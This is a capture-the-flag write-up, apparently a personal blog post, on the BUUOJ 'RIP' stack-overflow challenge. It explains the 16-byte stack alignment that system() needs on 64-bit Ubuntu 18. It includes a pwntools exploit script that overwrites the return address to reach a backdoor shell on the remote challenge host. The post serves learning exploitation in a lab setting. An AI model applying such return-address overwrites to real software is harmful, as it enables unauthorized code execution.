# Issues that may occur when calling system in 64-bit ELF in Ubuntu18

Recently, when I set up Ubuntu18 and was testing it, I encountered a problem.

After researching for a long time, I finally solved it and decided to take some notes.

[Challenge -- Buuoj -- RIP](https://buuoj.cn/challenges#rip)

### Problem

This challenge is a basic stack overflow problem. There is a backdoor function that directly calls `system("/bin/sh");` with no protections enabled. In theory, overwriting the return address should be sufficient.

Indeed, it worked fine during local testing, but issues arose during remote testing.

Upon further investigation, I discovered that when a 64-bit ELF program in Ubuntu18 or later calls the system function, stack balance needs to be considered in libc.

### Solution

Changing the payload length or performing stack pivoting can resolve this issue.

The main idea is to change the stack address.

Here is an example exploit:

```python
from pwn import *
context(log_level='debug', arch='amd64', os='linux')

# sh = process("./pwn1")
sh = remote("node4.buuoj.cn", 29726)

# sh.recvuntil('please input\n')

backdoor_addr = 0x0401186
# payload = b'a'*(0xf+8) + p64(backdoor_addr) # Normal idea, but due to alignment issues, it will fail
# payload = b'a'*0xf + p64(backdoor_addr) # Exploit 1, not very clear why this works:<
# payload = b'a'*(0xf+8) + p64(backdoor_addr) + p64(backdoor_addr - 1) # Exploit 2, backdoor_addr - 1 corresponds to a 'retn', can be replaced with others for stack balance
payload = b'a'*(0xf+8) + p64(backdoor_addr + 1) # Exploit 3, +1 aligns the address checked for alignment to 0x10 in call_system function
"""
It doesn't have to be +1. Aligning up to 16 times should work. If not, try stack pivoting.
"""
sh.sendline(payload)
sh.interactive()
```

### In-depth Analysis

Here, I plan to delve into the stack at this point, which also serves as an initial exploration of gdb.

> Oh no, it seems like gdb in Ubuntu18 is not working properly. I'll add more details once it's fixed:&lt;
